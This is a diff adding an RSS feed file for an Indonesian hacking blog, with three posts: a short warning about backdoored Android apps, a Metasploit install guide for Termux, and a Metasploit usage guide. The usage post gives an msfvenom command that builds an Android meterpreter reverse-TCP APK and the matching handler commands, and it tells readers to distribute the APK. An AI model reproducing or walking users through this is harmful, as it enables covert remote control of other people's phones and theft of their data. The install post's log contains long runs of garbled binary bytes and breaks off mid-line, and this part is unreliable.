@@ -1,0 +1,1733 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Hack&#39;s jurnal</title>
+        <link>https://maidey.github.io/blog/</link>
+        <description>Recent content on Hack&#39;s jurnal</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Fri, 29 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://maidey.github.io/blog/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>waspada shell backdoor di aplikasi</title>
+        <link>https://maidey.github.io/blog/artikel/waspada-shell-backdoor-di-aplikasi/</link>
+        <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/waspada-shell-backdoor-di-aplikasi/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/waspada-shell-backdoor-di-aplikasi/IMG_20211016_122151_999-picsay.jpg" alt="Featured image of post waspada shell backdoor di aplikasi" /&gt;&lt;p&gt;&lt;strong&gt;shall backdoor&lt;/strong&gt; sangat berbahaya karena bisa mencuri semua data yang kita punya dari hp, untuk karena itu Anda harus waspada dan bisa mengenali ciri-ciri dasar aplikasi yang sudah disusupi &lt;strong&gt;shall backdoor&lt;/strong&gt; .&lt;/p&gt;
+&lt;h3 id=&#34;ijin-yang-berlebihan&#34;&gt;IJIN YANG BERLEBIHAN&lt;/h3&gt;
+&lt;p&gt;Biasanya aplikasi yang disusupi Shell backdoor akan meminta ijin secara berlebihan bahkan meminta ijin akses seluruh hp anda.&lt;/p&gt;
+&lt;p&gt;Pastikan Anda langsung mencopot pemasangan aplikasi yang mencurigakan seperti ini.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 48; 
+			flex-basis: 117px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185346.png&#34; data-size=&#34;719x1469&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185346.png&#34;
+			width=&#34;719&#34;
+			height=&#34;1469&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185346_hu32b3365b1c4306a4f61051990dcba4c1_106319_480x0_resize_box_3.png 480w, https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185346_hu32b3365b1c4306a4f61051990dcba4c1_106319_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;wow 😂🖕&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;wow 😂🖕&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;aplikasi-kadaluarsa&#34;&gt;APLIKASI KADALUARSA&lt;/h3&gt;
+&lt;p&gt;Jangan pernah memasang aplikasi yang sudah kadaluarsa.
+Karena pembuatan aplikasi menggunakan cara lama aplikasi jadi gampang disusupi &lt;strong&gt;Shell backdoor&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 183; 
+			flex-basis: 441px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185407.png&#34; data-size=&#34;557x303&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185407.png&#34;
+			width=&#34;557&#34;
+			height=&#34;303&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185407_hu800c9a2bd90709641f2131d7fe026bec_27714_480x0_resize_box_3.png 480w, https://maidey.github.io/blog/blog/artikel/waspada-shell-backdoor-di-aplikasi/Screenshot_2021_1016_185407_hu800c9a2bd90709641f2131d7fe026bec_27714_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;🤔&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;🤔&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;mod&#34;&gt;MOD&lt;/h3&gt;
+&lt;p&gt;Jangan menggunakan aplikasi hasil modifikasi atau yang lebih dikenal dengan istilah &lt;strong&gt;MOD&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Sebaiknya Anda selalu memasang aplikasi melalui &lt;strong&gt;google play store&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Dan pastikan Anda selalu mengaktifkan &lt;strong&gt;google play protect&lt;/strong&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Semua yang diatas adalah ciri-ciri dasar , masih masih banyak ciri-ciri aplikasi yang disusupi Shell backdoor yang belum saya tahu.&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>cara menggunakan metasploit</title>
+        <link>https://maidey.github.io/blog/artikel/cara-menggunakan-metasploit/</link>
+        <pubDate>Fri, 15 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/cara-menggunakan-metasploit/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/cara-menggunakan-metasploit/20211015_204102.jpg" alt="Featured image of post cara menggunakan metasploit" /&gt;&lt;p&gt;Jangan lupa bergabung dengan channel telegram, klik &lt;a class=&#34;link&#34; href=&#34;https://t.me/hacks_jurnal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DISINI&lt;/a&gt; atau &lt;a class=&#34;link&#34; href=&#34;https://t.me/hacks_jurnal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@hacks_jurnal&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Artikel sebelumnya:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://maidey.github.io/blog/artikel/cara-menginstal-metasploit&#34; &gt;cara menginstal metasploit&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Melanjutkan artikel yang tadi , sekarang kita belajar menggunakan metasploit.&lt;/p&gt;
+&lt;p&gt;Sebelum melanjutkan ada beberapa hal yang harus Anda ketahui untuk menjadikan metasploit.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;IP Anda , cari tau disini &amp;gt; &lt;a class=&#34;link&#34; href=&#34;https://maidey.github.io/termux/ip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;IP saya&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Lokal Port (4.4.4.4 #recommend)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;menggunakan&#34;&gt;Menggunakan&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;pastikan Anda sudah setup storage dengan perintah &lt;code&gt;termux-setup-storage&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ganti &lt;span style=&#39;color:#ff0000;&#39;&gt;&lt;code&gt;NAMA&lt;/code&gt;&lt;/span&gt; terserah apa yang Anda suka.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ganti &lt;span style=&#39;color:#ff1734;&#39;&gt;&lt;code&gt;IPANDA&lt;/code&gt;&lt;/span&gt; dengan IP hape anda&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
+msfvenom -p android/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;IPANDA LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -o /sdcard/NAMA.apk
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Klik &lt;code&gt;enter↩️&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Kalau tampilan nya seperti dibawah ini silahkan sebarkan file apk nya atau anda install di hp anda sendiri untuk mencobanya.&lt;/p&gt;
+&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
+&lt;p&gt;lanjut ketahap selanjutnya.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ganti &lt;span style=&#39;color:#ff1734;&#39;&gt;&lt;code&gt;IPANDA&lt;/code&gt;&lt;/span&gt; dengan IP hape anda&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
+$ msfconsole
+
+ &amp;gt; use exploit/multi/handler
+ 
+ &amp;gt; set payload android/meterpreter/reverse_tcp
+
+ &amp;gt; set lhost IPANDA
+
+ &amp;gt; set lport &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;
+
+ &amp;gt; run
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ketik &lt;code&gt;help&lt;/code&gt; untuk mengetahui perintah yang bisa Anda gunakan.&lt;/p&gt;
+&lt;p&gt;Masih bingung atau anda pertanyaan silahkan hubungi kami di telegram.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>cara menginstal metasploit</title>
+        <link>https://maidey.github.io/blog/artikel/cara-menginstal-metasploit/</link>
+        <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/cara-menginstal-metasploit/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/cara-menginstal-metasploit/20211015_203930.jpg" alt="Featured image of post cara menginstal metasploit" /&gt;&lt;p&gt;Jangan lupa bergabung dengan channel telegram, klik &lt;a class=&#34;link&#34; href=&#34;https://t.me/hacks_jurnal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DISINI&lt;/a&gt; atau &lt;a class=&#34;link&#34; href=&#34;https://t.me/hacks_jurnal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@hacks_jurnal&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Beberapa waktu yang lalu banyak sekali yang request Di telegram💬 untuk cara install metasploit dan menggunakannya. BTW kalau anda mau request silahkan hubungi telegram kita &lt;a class=&#34;link&#34; href=&#34;https://t.me/Mogionc&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@mogionc&lt;/a&gt; &lt;code&gt;https://t.me/Mogionc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Saya akan membagi ini menjadi 2(dua) artikel , pertama artikel untuk cara menginstal dan yang kedua cara untuk menggunakannya.&lt;/p&gt;
+&lt;p&gt;Tanpa banyak basa-basi saya mulai saja tutorialnya, silahkan ikuti langkah-langkah dibawah ini⬇️.&lt;/p&gt;
+&lt;h1 id=&#34;install-metasplit&#34;&gt;install metaspl☢️it&lt;/h1&gt;
+&lt;h3 id=&#34;upgrade-dulu-termux-kesayangan-anda&#34;&gt;Upgrade dulu termux kesayangan anda&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
+
+pkg update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; pkg upgrade -y
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lalu install pemeran utamanya:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
+
+$ pkg install wget
+
+$ wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
+
+$ chmod +x metasploit.sh
+
+$ ./metasploit.sh
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Proses install akan lumayan lama jadi pastikan baterai hp anda masih banyak.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Jika proses install sukses akan muncul log seperti ini:&lt;/p&gt;
+&lt;details markdown=&#39;1&#39;&gt;&lt;summary&gt;Terminal LOG&lt;/summary&gt;
++-+-+-+-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+
+    |M|e|t|a|s|p|l|o|i|t| |i|n| |T|e|r|m|u|x|
+    +-+-+-+-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+                          +-+-+ +-+-+-+-+-+-+-+-+-+-+
+            |b|y| |G|u|s|h|m|a|z|u|k|o|                                +-+-+ +-+-+-+-+-+-+-+-+-+-+
+&lt;h2 id=&#34;--loading-&#34;&gt;=======================  Loading&amp;hellip; =======================&lt;/h2&gt;
+&lt;p&gt;============ *** Dependencies installation&amp;hellip; =============
+deb &lt;a class=&#34;link&#34; href=&#34;https://github.com/gushmazuko/metasploit_in_termux/raw/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/gushmazuko/metasploit_in_termux/raw/master&lt;/a&gt; gushmazuko main
+Checking availability of current mirror: ok
+Reading package lists&amp;hellip; Done
+Building dependency tree&amp;hellip; Done
+Reading state information&amp;hellip; Done                          gnupg is already the newest version (2.3.2-1).
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+8�H3�����N�l�]MW�=l���                                                        C�8�˷,�}սP�p�        ��MPV&amp;quot;�����6&lt;code&gt;bH�ػ���K0�k~v�d�j֙Qaw�                                            ����*{{|=$K���OR��!]yB�J�g���X��紁cwԿ���0�U�� � ��&amp;lt;������^�¦$� � ���z�8]r�U&amp;quot;n���V���[�ɭۻ��_�#f�Z�W  ��&#39;a ������f�� F��|(�yQ�xb�R-��N�*�M� TA&#39;��Ջ:���N Ρ%t�^�K�&#39;�8���;mNS�V^5���ќ��.���{M��ax}V�¡�vԦԕ�$\��KRg:�w=.d�3z/z�f1��        - N�����|?�O5ή&amp;gt;&amp;gt;����Z;q�I�M�R���&amp;quot;;���f��B�7�H�7P8�ݦ��-J�Q�Ic/G#��&amp;amp;gushmazuko &amp;lt;gushmazuko@protonmail.com&amp;gt;�8!���l�?z�6^F���Po�&lt;/code&gt;W��&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;   �
+    F���Po�0#�2V��cl�~�:o6�,��|U�ͷ��]CT���M0�¡�e5�\���U��;     ��_r�U�mARdj�ƹ��N�¬=�Y&amp;lt;C./�4M�8�_�e{��衘f����,��ڱ��
+                                                      �@#����-��X5`�?��|u ����m=
+                     )�VǖgB��&amp;quot;�L�/͖B$�
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;�&amp;gt;HXh\��ѥi{���U�����; �q̬�SQƜ��N�!߀����Չ��Ri�W�åQ%��&lt;em&gt;ȌZ�bۋDa���������ݞB&lt;code&gt;����g��c�&amp;amp;�9+��}�y�Q��؞�Pb�gXnT%��^;$�R3&amp;gt;��eT{���W�v�m��.���NԪ�y��)�V�6 �p�!�I�ۑ0�3�&amp;gt;�L���?��y�T|�wBԙ���^��ǚ�sy!�^U@��ɢj&amp;lt;=�Pt9�b&amp;amp;WJ&lt;/code&gt;W����v���J8���%�+����A.�&#39;��K+��X.g\I��&lt;code&gt;�x i��)Xo&amp;amp;��n�&amp;lt;ֆ�5P���O�V�[&#39;��^�T�a�� ���Ed[&amp;gt;djr��o��� 2����T���K�.����Z�m �3a��}�!��?�@.�|�#�G��ܭ�����@�F){v�:�^��,q� ���Gy$�b��a��Xc��?6��D����*�[y���D�����+HVP��v&amp;amp;T&lt;/code&gt;�p\��&amp;amp;�/,o���o�TX��%p�os��]������ד�WƥԖJ���r��1�[���[��-�n��ݳ��?K��{L�PM���zH��H�{���@�钃&amp;lt;f��4��&lt;/em&gt;��EMO�@J�ݞӢ��ki��7�W-��W������PRig*���=8�Ӿ�V��hM�msY;�
+�M��|�b�H��
+��Tk��n1S���x�z��\�y�}��W�:I�c���]vsXEK��
+�4�&lt;code&gt;�M!��4�wd=ȭ+�� !���l�?z�6^F���Po�&lt;/code&gt;W��&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    F���Po�k��?��d��j����-�dh�[�f�K7�`�ɠ��=
+                                           �]�G��&amp;quot;�������3�)��D��Vj��J
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;g��^#���3b���V;�����a�Tv�
+�W�&amp;quot;s;.KK�K�q}}GKt#��7ڊ�
+��m�F&amp;quot;=*�
+�Fj�&amp;amp;��zF&#39;1�A �/�6f��9ண��7�����=�4���z߅�$��Mֈ
+y�diJ��ű&lt;code&gt;�OAg�^�7�- ��Y����y&#39;�����M#�\�#H������R�~0CQp���o6B�(���p��hC��lq�Vs�J{ory���u]�d���(��y�&amp;lt;���k@.Fȷ�l&amp;quot;jԵ��� �,�b+���꜠4���5Ұ75D��sΰ|!�to-f|����п �W�:�a�·���!�� %&lt;/code&gt;v�����7�����ᘅS&amp;quot;�ë���1O�L
+a,�#&amp;amp;�Kl�;����c=*4
+b��f�+U�ag&amp;lt;�!��p�`v�## Set low priority for all gushmazuko repository (for security purposes)
+Package: *
+Pin: release gushmazuko
+Pin-Priority: 100&lt;/p&gt;
+&lt;h2 id=&#34;set-highest-priority-for-ruby-package-from-gushmazuko-repository&#34;&gt;Set highest priority for ruby package from gushmazuko repository&lt;/h2&gt;
+&lt;p&gt;Package: ruby
+Pin: release gushmazuko
+Pin-Priority: 1001
+Reading package lists&amp;hellip; Done
+Building dependency tree&amp;hellip; Done
+Reading state information&amp;hellip; Done
+The following package was automatically installed and is no longer required:
+libyaml
+Use &amp;lsquo;apt autoremove&amp;rsquo; to remove it.
+The following packages will be REMOVED:
+ruby*
+0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.
+After this operation, 23.6 MB disk space will be freed.
+(Reading database &amp;hellip; 21099 files and directories currently installed.)
+Removing ruby (2.7.2-3) &amp;hellip;
+dpkg: warning: while removing ruby, directory &amp;lsquo;/data/data/com.termux/files/usr/lib/ruby/gems/2.7.0/gems&amp;rsquo; not empty so not removed
+dpkg: warning: while removing ruby, directory &amp;lsquo;/data/data/com.termux/files/usr/lib/ruby/gems/2.7.0/specifications&amp;rsquo; not empty so not removed
+dpkg: warning: while removing ruby, directory &amp;lsquo;/data/data/com.termux/files/usr/lib/ruby/gems/2.7.0/cache&amp;rsquo; not empty so not removed
+Checking availability of current mirror: ok
+Get:1 &lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master&lt;/a&gt; gushmazuko InRelease [7397 B]
+Hit:2 &lt;a class=&#34;link&#34; href=&#34;https://packages.termux.org/apt/termux-main&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://packages.termux.org/apt/termux-main&lt;/a&gt; stable InRelease
+Fetched 7397 B in 4s (1968 B/s)
+Reading package lists&amp;hellip; Done
+Building dependency tree&amp;hellip; Done
+Reading state information&amp;hellip; Done
+All packages are up to date.
+Reading package lists&amp;hellip; Done
+Building dependency tree&amp;hellip; Done
+Reading state information&amp;hellip; Done
+Calculating upgrade&amp;hellip; Done
+The following package was automatically installed and is no longer required:
+libyaml
+Use &amp;lsquo;apt autoremove&amp;rsquo; to remove it.
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+Checking availability of current mirror: ok
+Reading package lists&amp;hellip; Done
+Building dependency tree&amp;hellip; Done
+Reading state information&amp;hellip; Done
+apr is already the newest version (1.7.0-4).
+apr-util is already the newest version (1.6.1-5).
+autoconf is already the newest version (2.71-2).
+bison is already the newest version (3.8.2).
+clang is already the newest version (12.0.1).
+coreutils is already the newest version (8.32-8).
+curl is already the newest version (7.79.1).
+findutils is already the newest version (4.8.0).
+git is already the newest version (2.33.1).
+libffi is already the newest version (3.4.2).
+libgmp is already the newest version (6.2.1).
+libgrpc is already the newest version (1.38.1).
+libpcap is already the newest version (1.10.1).
+libsqlite is already the newest version (3.36.0-1).
+libtool is already the newest version (2.4.6-8).
+libxml2 is already the newest version (2.9.12-1).
+libxslt is already the newest version (1.1.34-1).
+make is already the newest version (4.3-1).
+ncurses is already the newest version (6.2.20200725-6).
+ncurses-utils is already the newest version (6.2.20200725-6).
+openssl is already the newest version (1.1.1l).
+pkg-config is already the newest version (0.29.2).
+postgresql is already the newest version (13.3).
+python is already the newest version (3.10.0-1).
+readline is already the newest version (8.1.1).
+tar is already the newest version (1.34).
+termux-elf-cleaner is already the newest version (1.7).
+termux-tools is already the newest version (0.143).
+unzip is already the newest version (6.0-7).
+wget is already the newest version (1.21.1).
+zip is already the newest version (3.0-5).
+The following NEW packages will be installed:
+ruby
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+Need to get 0 B/4092 kB of archives.
+After this operation, 23.6 MB of additional disk space will be used.
+Selecting previously unselected package ruby.
+(Reading database &amp;hellip; 19306 files and directories currently installed.)
+Preparing to unpack &amp;hellip;/ruby_2.7.2-3_aarch64.deb &amp;hellip;
+Unpacking ruby (2.7.2-3) &amp;hellip;
+Setting up ruby (2.7.2-3) &amp;hellip;
+Requirement already satisfied: pip in /data/data/com.termux/files/usr/lib/python3.10/site-packages (21.3)
+Requirement already satisfied: requests in /data/data/com.termux/files/usr/lib/python3.10/site-packages (2.26.0)
+Requirement already satisfied: urllib3&amp;lt;1.27,&amp;gt;=1.21.1 in /data/data/com.termux/files/usr/lib/python3.10/site-packages (from requests) (1.26.7)
+Requirement already satisfied: idna&amp;lt;4,&amp;gt;=2.5 in /data/data/com.termux/files/usr/lib/python3.10/site-packages (from requests) (3.3)
+Requirement already satisfied: charset-normalizer~=2.0.0 in /data/data/com.termux/files/usr/lib/python3.10/site-packages (from requests) (2.0.7)
+Requirement already satisfied: certifi&amp;gt;=2017.4.17 in /data/data/com.termux/files/usr/lib/python3.10/site-packages (from requests) (2021.10.8)&lt;/p&gt;
+&lt;p&gt;================= *** Fix ruby BigDecimal =================
+Reading package lists&amp;hellip;
+Building dependency tree&amp;hellip;
+Reading state information&amp;hellip;
+patchelf is already the newest version (0.13).
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.&lt;/p&gt;
+&lt;p&gt;========== *** Erasing old metasploit folder&amp;hellip; ===========&lt;/p&gt;
+&lt;p&gt;=================== *** Downloading&amp;hellip; ====================
+Cloning into &amp;lsquo;metasploit-framework&amp;rsquo;&amp;hellip;
+remote: Enumerating objects: 13372, done.
+remote: Counting objects: 100% (13372/13372), done.
+remote: Compressing objects: 100% (11530/11530), done.
+Receiving objects:   4% (557/13372), 3.75 MiB | 821.00 KiB/Receiving objects:   4% (563/13372), 4.04 MiB | 797.00 KiB/Receiving objects:   4% (588/13372), 4.87 MiB | 877.00 KiB/Receiving objects:   4% (602/13372), 6.98 MiB | 898.00 KiB/Receiving objects:   5% (669/13372), 7.86 MiB | 923.00 KiB/Receiving objects:   6% (803/13372), 7.86 MiB | 923.00 KiB/Receiving objects:   7% (937/13372), 7.86 MiB | 923.00 KiB/Receiving objects:   8% (1070/13372), 7.86 MiB | 923.00 KiBReceiving objects:   8% (1129/13372), 7.86 MiB | 923.00 KiBReceiving objects:   9% (1204/13372), 7.86 MiB | 923.00 KiBReceiving objects:   9% (1288/13372), 9.82 MiB | 1.30 MiB/sReceiving objects:   9% (1322/13372), 11.48 MiB | 1.39 MiB/Receiving objects:   9% (1323/13372), 12.34 MiB | 1.36 MiB/Receiving objects:   9% (1323/13372), 14.04 MiB | 1.31 MiB/Receiving objects:   9% (1323/13372), 15.50 MiB | 1.21 MiB/Receiving objects:   9% (1324/13372), 16.49 MiB | 1.42 MiB/Receiving objects:   9% (1324/13372), 17.68 MiB | 1.32 MiB/Receiving objects:  10% (1338/13372), 17.68 MiB | 1.32 MiB/Receiving objects:  10% (1409/13372), 18.10 MiB | 1.22 MiB/Receiving objects:  10% (1410/13372), 18.67 MiB | 985.00 KiReceiving objects:  10% (1410/13372), 19.20 MiB | 779.00 KiReceiving objects:  10% (1410/13372), 19.41 MiB | 606.00 KiReceiving objects:  10% (1410/13372), 20.15 MiB | 517.00 KiReceiving objects:  10% (1410/13372), 20.91 MiB | 542.00 KiReceiving objects:  10% (1412/13372), 21.83 MiB | 676.00 KiReceiving objects:  10% (1413/13372), 23.32 MiB | 897.00 KiReceiving objects:  10% (1413/13372), 24.64 MiB | 1.08 MiB/Receiving objects:  10% (1414/13372), 25.62 MiB | 1.20 MiB/Receiving objects:  10% (1425/13372), 28.22 MiB | 1.53 MiB/Receiving objects:  10% (1425/13372), 29.90 MiB | 1.62 MiB/Receiving objects:  10% (1428/13372), 32.18 MiB | 1.76 MiB/Receiving objects:  10% (1433/13372), 34.21 MiB | 1.87 MiB/Receiving objects:  11% (1471/13372), 34.21 MiB | 1.87 MiB/Receiving objects:  11% (1520/13372), 35.71 MiB | 1.98 MiB/Receiving objects:  12% (1605/13372), 35.71 MiB | 1.98 MiB/Receiving objects:  13% (1739/13372), 36.85 MiB | 2.06 MiB/Receiving objects:  14% (1873/13372), 36.85 MiB | 2.06 MiB/Receiving objects:  14% (1900/13372), 37.62 MiB | 2.03 MiB/Receiving objects:  14% (1928/13372), 39.21 MiB | 2.01 MiB/Receiving objects:  15% (2006/13372), 39.21 MiB | 2.01 MiB/Receiving objects:  16% (2140/13372), 39.21 MiB | 2.01 MiB/Receiving objects:  17% (2274/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  18% (2407/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  19% (2541/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  20% (2675/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  21% (2809/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  22% (2942/13372), 40.07 MiB | 1.94 MiB/Receiving objects:  23% (3076/13372), 41.15 MiB | 1.94 MiB/Receiving objects:  23% (3205/13372), 41.15 MiB | 1.94 MiB/Receiving objects:  24% (3210/13372), 41.15 MiB | 1.94 MiB/Receiving objects:  25% (3343/13372), 41.15 MiB | 1.94 MiB/Receiving objects:  26% (3477/13372), 41.74 MiB | 1.82 MiB/Receiving objects:  27% (3611/13372), 41.74 MiB | 1.82 MiB/Receiving objects:  28% (3745/13372), 41.74 MiB | 1.82 MiB/Receiving objects:  29% (3878/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  30% (4012/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  31% (4146/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  31% (4251/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  32% (4280/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  33% (4413/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  34% (4547/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  35% (4681/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  36% (4814/13372), 42.89 MiB | 1.91 MiB/Receiving objects:  37% (4948/13372), 44.07 MiB | 1.84 MiB/Receiving objects:  38% (5082/13372), 44.07 MiB | 1.84 MiB/Receiving objects:  39% (5216/13372), 44.07 MiB | 1.84 MiB/Receiving objects:  40% (5349/13372), 44.07 MiB | 1.84 MiB/Receiving objects:  40% (5400/13372), 45.19 MiB | 1.84 MiB/Receiving objects:  41% (5483/13372), 45.19 MiB | 1.84 MiB/Receiving objects:  42% (5617/13372), 45.19 MiB | 1.84 MiB/Receiving objects:  43% (5750/13372), 45.61 MiB | 1.77 MiB/Receiving objects:  44% (5884/13372), 45.61 MiB | 1.77 MiB/Receiving objects:  45% (6018/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  46% (6152/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  47% (6285/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  48% (6419/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  49% (6553/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  49% (6554/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  50% (6686/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  51% (6820/13372), 46.00 MiB | 1.74 MiB/Receiving objects:  52% (6954/13372), 47.28 MiB | 1.79 MiB/Receiving objects:  53% (7088/13372), 47.28 MiB | 1.79 MiB/Receiving objects:  54% (7221/13372), 47.28 MiB | 1.79 MiB/Receiving objects:  55% (7355/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  56% 